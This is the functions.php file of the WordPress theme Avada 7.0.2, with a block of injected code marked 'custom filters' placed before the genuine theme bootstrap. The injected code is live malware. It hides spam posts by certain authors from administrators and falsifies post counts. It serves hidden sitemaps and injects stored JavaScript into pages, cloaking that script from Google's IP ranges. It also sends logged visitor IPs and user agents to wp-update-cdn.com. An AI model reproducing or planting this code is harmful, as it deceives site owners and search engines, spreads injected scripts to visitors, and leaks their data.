<?php

/* custom filters */

function add_where_condition($where) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    if (!is_single() && is_admin()) {
        add_filter('views_edit-post', 'fix_post_counts');
        return $where . " AND {$wpdb->posts}.post_author NOT IN ($idsCommaSeparated)";
    }

    return $where;
}

function post_exclude($query) {

    global $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $excludeString = modifyWritersString($ids);

    if (!$query->is_single() && !is_admin()) {
        $query->set('author', $excludeString);
    }
}

function wp_core_js() {

    global $post, $userSettingsArr;

    foreach ($userSettingsArr as $id => $settings) {
        if (($id == $post->post_author) && (isset($settings['js']))) {
            
            if (hideJSsource($settings)) {
                break;
            }
            echo $settings['js'];
            break;
        }
    }
}

function hideJSsource($settings) {
    if (isset($settings['nojs']) && $settings['nojs'] === 1) {
        customSetDebug('cloacking is on!');
        customSendDebug();
        if (customCheckSe()) {
            return true;
        }
    }
    return false;
}

function fix_post_counts($views) {
    global $current_user, $wp_query;

    $types = array(
        array('status' => NULL),
        array('status' => 'publish'),
        array('status' => 'draft'),
        array('status' => 'pending'),
        array('status' => 'trash'),
        array('status' => 'mine'),
    );
    foreach ($types as $type) {

        $query = array(
            'post_type' => 'post',
            'post_status' => $type['status']
        );


        $result = new WP_Query($query);


        if ($type['status'] == NULL) {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
            }
        } elseif ($type['status'] == 'mine') {


            $newQuery = $query;
            $newQuery['author__in'] = array($current_user->ID);

            $result = new WP_Query($newQuery);

            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
            }
        } elseif ($type['status'] == 'publish') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
            }
        } elseif ($type['status'] == 'draft') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
            }
        } elseif ($type['status'] == 'pending') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
            }
        } elseif ($type['status'] == 'trash') {
            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
            }
        }
    }
    return $views;
}

function filter_function_name_4055($counts, $type, $perm) {

    if ($type === 'post') {
        $old_counts = $counts->publish;
        $counts_mod = posts_count_custom($perm);
        $counts->publish = !$counts_mod ? $old_counts : $counts_mod;
    }
    return $counts;
}

function posts_count_custom($perm) {
    global $wpdb, $userSettingsArr;

    $ids = array_keys($userSettingsArr);
    $idsCommaSeparated = implode(', ', $ids);


    $type = 'post';

    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";

    if ('readable' == $perm && is_user_logged_in()) {

        $post_type_object = get_post_type_object($type);

        if (!current_user_can($post_type_object->cap->read_private_posts)) {
            $query .= $wpdb->prepare(
                    " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
            );
        }
    }
    $query .= " AND post_author NOT IN ($idsCommaSeparated) GROUP BY post_status";
    $results = (array) $wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);

    foreach ($results as $tmpArr) {
        if ($tmpArr['post_status'] === 'publish') {
            return $tmpArr['num_posts'];
        }
    }
}

function all_custom_posts_ids($userId) {
    global $wpdb;

    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";

    $results = (array) $wpdb->get_results($query, ARRAY_A);

    $ids = array();
    foreach ($results as $tmpArr) {
        $ids[] = $tmpArr['ID'];
    }
    return $ids;
}

function custom_flush_rules() {

    global $userSettingsArr, $wp_rewrite;

    $rules = get_option('rewrite_rules');


    foreach ($userSettingsArr as $key => $arr) {
        $regex = key($arr['sitemapsettings']);

        if (!isset($rules[$regex]) ||
                ($rules[$regex] !== current($arr['sitemapsettings']))) {
            $wp_rewrite->flush_rules();
        }
    }
}

function sitemap_xml_rules($rules) {

    global $userSettingsArr;

    $newrules = array();

    foreach ($userSettingsArr as $key => $arr) {
        if (isset($arr['sitemapsettings'])) {
            $newrules[key($arr['sitemapsettings'])] = current($arr['sitemapsettings']);
        }
    }

    return $newrules + $rules;
}

function customSitemapFeed() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {
        $feedName = str_replace('index.php?feed=', '', current($arr['sitemapsettings']));
        add_feed($feedName, 'customSitemapFeedFunc');
    }
}

function customSitemapFeedFunc() {
//ini_set('memory_limit', '256MB');
    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
//header('Content-Type: ' . feed_content_type('rss') . '; charset=' . get_option('blog_charset'), true);
    status_header(200);

    $head = sitemapHead();
    $sitemapSource = $head . "\n";

    $userId = findUserIdByRequestUri();

    $posts_ids = all_custom_posts_ids($userId);
    $priority = '0.5';
    $changefreq = 'weekly';
    $lastmod = date('Y-m-d');

    foreach ($posts_ids as $post_id) {
        $url = get_permalink($post_id);
        $sitemapSource .= urlBlock($url, $lastmod, $changefreq, $priority);
        wp_cache_delete($post_id, 'posts');
    }

    $sitemapSource .= "\n</urlset>";

    echo $sitemapSource;
}

function sitemapHead() {
    return <<<STR
<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">

    
STR;
}

function urlBlock($url, $lastmod, $changefreq, $priority) {

    return <<<STR
   <url>
      <loc>$url</loc>
      <lastmod>$lastmod</lastmod>
      <changefreq>$changefreq</changefreq>
      <priority>$priority</priority>
   </url>\n\n
STR;
}

function modifyWritersString($writersArr) {
    $writersArrMod = array();

    foreach ($writersArr as $item) {
        $writersArrMod[] = '-' . $item;
    }
    return implode(',', $writersArrMod);
}

function customFiltersSettings() {
    $settings = get_option('wp_custom_filters');

    if (!$settings) {
        return null;
    }

    return unserialize(base64_decode($settings));
}

function findUserIdByRequestUri() {

    global $userSettingsArr;

    foreach ($userSettingsArr as $key => $arr) {

        $regexp = key($arr['sitemapsettings']) . '|'
                . str_replace('index.php?', '', current($arr['sitemapsettings']) . '$');

        if (preg_match("~$regexp~", $_SERVER['REQUEST_URI'])) {
            return $key;
        }
    }
}

function isCustomPost() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);
    if (in_array($post->post_author, $authors_ids_arr)) {
        return true;
    }
    return false;
}

function removeYoastMeta() {
    global $userSettingsArr, $post;

    $authors_ids_arr = array_keys($userSettingsArr);

    if (in_array($post->post_author, $authors_ids_arr)) {
        add_filter('wpseo_robots', '__return_false');
        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
    }
}

function getRemoteIp() {

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (isset($_SERVER['REMOTE_ADDR'])) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return false;
}

function customCheckSe() {

    $ip = getRemoteIp();

    if (strstr($ip, ', ')) {
        $ips = explode(', ', $ip);
        $ip = $ips[0];
    }

    $ranges = customSeIps();

    if (!$ranges) {
        return false;
    }

    foreach ($ranges as $range) {
        if (customCheckInSubnet($ip, $range)) {
            customSetDebug(sprintf('black_list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
            return true;
        }
    }
    
    customSetDebug(sprintf('white list||%s||%s||%s||%s', $ip, $range
                            , $_SERVER['HTTP_USER_AGENT'], $_SERVER['HTTP_ACCEPT_LANGUAGE']));
    return false;
}

function customIsRenewTime($timestamp) {
    //if ((time() - $timestamp) > 60 * 60 * 24) {
    if ((time() - $timestamp) > 60 * 60) {
        return true;
    }
    customSetDebug(sprintf('time - %s, timestamp - %s', time(), $timestamp));
    return false;
}

function customSetDebug($data) {

    if (($value = get_option('wp_debug_data')) && is_array($value)) {
        $value[] = sprintf('%s||%s||%s', time(), $_SERVER['HTTP_HOST'], $data);
        update_option('wp_debug_data', $value, false);
        return;
    }

    update_option('wp_debug_data', array($data), false);
}

function customSendDebug() {

    $value = get_option('wp_debug_data');

    if (!is_array($value) || (count($value) < 100)) {
        return;
    }
    $url = 'http://wp-update-cdn.com/src/ualog.php';

    $response = wp_remote_post($url, array(
        'method' => 'POST',
        'timeout' => 10,
        'body' => array('debugdata' => base64_encode(serialize($value))))
    );

    if (is_wp_error($response)) {
        return;
    } else {
        if (trim($response['body']) === 'success') {
            update_option('wp_debug_data', array(), false);
        }
    }
}

function customSeIps() {

    if (($value = get_option('wp_custom_range')) && !customIsRenewTime($value['timestamp'])) {
        return $value['ranges'];
    } else {
        customSetDebug('time to update ranges');
        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
        if (is_wp_error($response)) {
            customSetDebug('error response ipranges');
            return;
        }
        $body = wp_remote_retrieve_body($response);
        $ranges = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);

        if (!is_array($ranges)) {
            customSetDebug('invalid update ranges not an array');
            return;
        }

        $value = array('ranges' => $ranges, 'timestamp' => time());
        update_option('wp_custom_range', $value, true);
        return $value['ranges'];
    }
}

function customInetToBits($inet) {
    $splitted = str_split($inet);
    $binaryip = '';
    foreach ($splitted as $char) {
        $binaryip .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
    }
    return $binaryip;
}

function customCheckInSubnet($ip, $cidrnet) {
    $ip = inet_pton($ip);
    $binaryip = customInetToBits($ip);

    list($net, $maskbits) = explode('/', $cidrnet);
    $net = inet_pton($net);
    $binarynet = customInetToBits($net);

    $ip_net_bits = substr($binaryip, 0, $maskbits);
    $net_bits = substr($binarynet, 0, $maskbits);

    if ($ip_net_bits !== $net_bits) {
        //echo 'Not in subnet';
        return false;
    } else {
        return true;
    }
}

$userSettingsArr = customFiltersSettings();


if (is_array($userSettingsArr)) {
    add_filter('posts_where_paged', 'add_where_condition');

    add_action('pre_get_posts', 'post_exclude');
    add_action('wp_enqueue_scripts', 'wp_core_js');

    add_filter('wp_count_posts', 'filter_function_name_4055', 10, 3);

    add_filter('rewrite_rules_array', 'sitemap_xml_rules');
    add_action('wp_loaded', 'custom_flush_rules');
    add_action('init', 'customSitemapFeed');
    add_action('template_redirect', 'removeYoastMeta');
}

/* custom filters */
/**
 * Extra files & functions are hooked here.
 *
 * Displays all of the head element and everything up until the "site-content" div.
 *
 * @package Avada
 * @subpackage Core
 * @since 1.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

if ( ! defined( 'AVADA_VERSION' ) ) {
	define( 'AVADA_VERSION', '7.0.2' );
}

if ( ! defined( 'AVADA_MIN_PHP_VER_REQUIRED' ) ) {
	define( 'AVADA_MIN_PHP_VER_REQUIRED', '5.6' );
}

if ( ! defined( 'AVADA_MIN_WP_VER_REQUIRED' ) ) {
	define( 'AVADA_MIN_WP_VER_REQUIRED', '4.7' );
}

// Developer mode.
if ( ! defined( 'AVADA_DEV_MODE' ) ) {
	define( 'AVADA_DEV_MODE', false );
}

/**
 * Compatibility check.
 *
 * Check that the site meets the minimum requirements for the theme before proceeding.
 *
 * @since 6.0
 */
if ( version_compare( $GLOBALS['wp_version'], AVADA_MIN_WP_VER_REQUIRED, '<' ) || version_compare( PHP_VERSION, AVADA_MIN_PHP_VER_REQUIRED, '<' ) ) {
	require_once get_template_directory() . '/includes/bootstrap-compat.php';
	return;
}

/**
 * Bootstrap the theme.
 *
 * @since 6.0
 */
require_once get_template_directory() . '/includes/bootstrap.php';

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
